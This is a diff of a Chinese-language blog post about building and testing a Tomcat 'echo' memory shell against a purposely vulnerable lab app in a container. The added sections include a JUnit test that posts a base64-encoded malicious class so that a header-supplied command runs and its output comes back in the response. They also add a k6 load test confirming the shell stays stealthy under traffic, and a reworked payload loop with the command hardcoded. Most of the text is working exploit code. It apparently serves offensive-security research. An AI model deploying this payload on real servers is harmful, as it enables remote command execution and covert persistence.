@@ -268,9 +268,16 @@ public class Tomcat8ContainerTest {
 
     @Container
     public final static GenericContainer<?> container = new GenericContainer<>(imageName)
-            .withCopyToContainer(warFile, "/usr/local/tomcat/webapps/app.war")
-            .waitingFor(Wait.forHttp("/app"))
-            .withExposedPorts(8080);
+            .withCopyToContainer(warFile, "/usr/local/tomcat/webapps/app.war") // 挂载靶场包
+            .waitingFor(Wait.forHttp("/app")) // 等待靶场成功，/app 可访问
+            .withExposedPorts(8080); // 暴露端口
+
+    public static String getUrl(GenericContainer<?> container) {
+        int port = container.getMappedPort(8080); // 获取 8080 随机映射端口
+        String url = "http://127.0.0.1:" + port + "/app";
+        log.info("container started, app url is : {}", url);
+        return url;
+    }
 
     @Test
     @SneakyThrows
@@ -286,7 +293,7 @@ public class Tomcat8ContainerTest {
                 .url(url + "/b64").post(requestBody)
                 .build();
         try (Response response = new OkHttpClient().newCall(request).execute()) {
-            System.out.println(container.getLogs());
+            System.out.println(container.getLogs()); // 打印 Tomcat 容器日志，在 TomcatEcho 加打印可以直接看
             assertThat(response.body().string(), anyOf(
                     containsString("uid=")
             ));
@@ -299,7 +306,7 @@ public class Tomcat8ContainerTest {
 
 ![test-speed](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/TomcatEchoShell_img/test-speed.png)
 
-接下来就是编写回显命令执行异常的回显情况
+接下来就是编写回显命令执行异常的回显情况，执行系统没有的命令
 
 ```java
 @Test
@@ -323,7 +330,7 @@ void testCommandEchoException() {
 }
 ```
 
-代码调整为如下，InputStream 没东西，就拿 ErrorStream
+代码调整为如下，InputStream 没东西就拿 ErrorStream
 
 ```java
 private String run(String data) throws Exception {
@@ -586,3 +593,157 @@ public class TomcatEcho {
 ```
 
 MemShellParty 2.0 目前仍然在开发阶段，这部分代码之后会随着发版进行上线，敬请期待。
+
+## 额外的测试
+
+RequestGroupInfo 中拿到的 processors 是 Tomcat 整个生命周期所有的 RequestInfo 对象，其中也包含其他业务请求，当业务在高并发环境下做回显马利用，会不会有修改其他业务请求回显的风险，导致业务行为中断。
+
+测试方法，编写 K6 压测脚本，10 线程并行压测业务接口，并断言响应码为 200，调整回显马代码，回显成功时修改 response.statusCode 为 201，在压测过程中，发送回显马利用，如果有影响，压测报告中会有不是 200 的响应结果。**结论是当前回显马并不会影响正常业务**。
+
+压测脚本：k6test.js
+
+```js
+import http from 'k6/http';
+import {check, sleep} from 'k6';
+
+export const options = {
+    rps: 4500,
+    vus: 10,
+    duration: '5m',
+};
+
+export default function () {
+    const res = http.get('http://localhost:8082/app/test');
+    check(res, {
+        'status is 200': (r) => r.status === 200,
+    });
+    sleep(1);
+}
+
+```
+
+回显马调整：
+
+```java
+if (data != null && !data.isEmpty()) {
+    PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
+    try {
+        writer.write(run(data));
+    } catch (Throwable e) {
+        e.printStackTrace(writer);
+    }
+    invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{201}); // 这儿设置新的状态码
+    writer.flush();
+    writer.close();
+    return;
+}
+```
+
+新写一个单测，用于回显马利用：
+
+```java
+public class EchoTest {
+    @Test
+    @SneakyThrows
+    void test() {
+        String url = "http://localhost:8082/app";
+        String content = DetectionTool.getBase64Class(TomcatEcho.class);
+        RequestBody requestBody = new FormBody.Builder()
+                .add("data", content)
+                .build();
+        Request request = new Request.Builder()
+                .header("Content-Type", "application/x-www-form-urlencoded")
+                .header("X-Echo", "id")
+                .url(url + "/b64").post(requestBody)
+                .build();
+        try (Response response = new OkHttpClient().newCall(request).execute()) {
+            assertEquals(201, response.code());
+            assertThat(response.body().string(), anyOf(
+                    containsString("uid=")
+            ));
+        }
+    }
+}
+```
+
+启动靶场，并开启压测脚本：
+
+```bash
+k6 run k6test.js 
+```
+
+运行回显马单测成功，且压测数据无异常
+
+```text
+EchoTest > test() PASSED
+```
+
+```text
+❯ k6 run asserts/k6test.js
+
+         /\      Grafana   /‾‾/  
+    /\  /  \     |\  __   /  /   
+   /  \/    \    | |/ /  /   ‾‾\ 
+  /          \   |   (  |  (‾)  |
+ / __________ \  |_|\_\  \_____/ 
+
+     execution: local
+        script: asserts/k6test.js
+        output: -
+
+     scenarios: (100.00%) 1 scenario, 10 max VUs, 5m30s max duration (incl. graceful stop):
+              * default: 10 looping VUs for 5m0s (gracefulStop: 30s)
+  █ TOTAL RESULTS 
+
+    checks_total.......................: 2820    9.398366/s
+    checks_succeeded...................: 100.00% 2820 out of 2820
+    checks_failed......................: 0.00%   0 out of 2820
+
+    ✓ status is 200
+
+running (5m00.1s), 00/10 VUs, 2820 complete and 0 interrupted iterations
+default ✓ [======================================] 10 VUs  5m0s
+```
+
+额外的发现，processor 这个对象就是 RequestInfo，注释说 without having to deal with synchronization，不用关系线程安全的问题，我测试了一下当前线程下只会有一个能用的。
+
+```java
+/**
+ * Structure holding the Request and Response objects. It also holds statistical information about request processing
+ * and provide management information about the requests being processed. Each thread uses a Request/Response pair that
+ * is recycled on each request. This object provides a place to collect global low-level statistics - without having to
+ * deal with synchronization ( since each thread will have it's own RequestProcessorMX ).
+ *
+ * @author Costin Manolache
+ */
+public class RequestInfo {
+}
+```
+
+因此回显马也可以改为如下：
+
+```java
+for (Object processor : processors) {
+    Integer stage = (Integer) getFieldValue(processor, "stage");
+    if (stage == 7) { // org.apache.coyote.Constants#STAGE_ENDED
+        continue;
+    }
+    // org.apache.coyote.Request
+    Object coyoteRequest = getFieldValue(processor, "req");
+    // org.apache.catalina.connector.Request
+    Object request = invokeMethod(coyoteRequest, "getNote", new Class[]{Integer.TYPE}, new Object[]{1});
+    // org.apache.catalina.connector.Response
+    Object response = invokeMethod(request, "getResponse", null, null);
+    String data = "id"; // 直接将执行命令内置在字节码中
+    PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
+    try {
+        writer.write(run(data));
+    } catch (Throwable e) {
+        e.printStackTrace(writer);
+    }
+    invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{201});
+    writer.flush();
+    writer.close();
+    return;
+}
+```
